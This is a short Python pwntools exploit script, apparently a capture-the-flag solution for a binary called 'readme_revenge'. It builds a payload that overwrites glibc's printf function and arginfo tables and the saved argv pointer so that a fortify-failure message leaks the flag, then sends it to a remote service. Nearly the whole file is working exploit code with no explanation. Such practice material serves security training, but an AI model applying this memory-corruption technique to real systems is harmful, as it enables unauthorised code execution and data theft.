# coding=utf8
from pwn import *

flag_add=0x6b4040
libc_argv=0x6B7980
name=0x6b73e0
call_fortify=0x43599b
printf_function_table_add=0x6B7A28
printf_arginfo_table_add=0x6B7AA8
# 将name 写为function_table
offset=ord("s")*8

payload=fit({
	0:p64(call_fortify),
	8:flag_add,
	printf_function_table_add-name:p64(1),
	printf_arginfo_table_add-name:p64(name-offset),
	libc_argv-name:p64(name+8)
	},filler="\x00")

# conn=process("./readme_revenge")
conn=remote("10.131.1.19",60004)
conn.sendline(payload)
print conn.recv()
